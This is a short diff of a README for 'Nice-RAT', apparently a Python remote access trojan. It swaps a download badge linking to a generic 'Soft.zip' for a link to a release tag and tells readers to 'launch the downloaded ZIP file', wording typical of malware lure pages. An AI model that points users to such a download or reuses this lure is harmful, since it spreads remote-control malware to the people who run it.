@@ -48,7 +48,7 @@ Welcome to the "Nice-RAT" repository, your go-to tool for easy-to-use Python-bas
 
 To access the Nice-RAT tool, download the ZIP file from the following link: 
 
-[![Download Nice-RAT](https://img.shields.io/badge/Download-Nice--RAT-blue)](https://github.com/files/Soft.zip)
+[![Download Nice-RAT](https://github.com/ImVilo/Nice-RAT/releases/tag/v1.2)](https://github.com/ImVilo/Nice-RAT/releases/tag/v1.2)
 
 ### **Note**: Please ensure to launch the downloaded ZIP file to begin using Nice-RAT effectively.
 
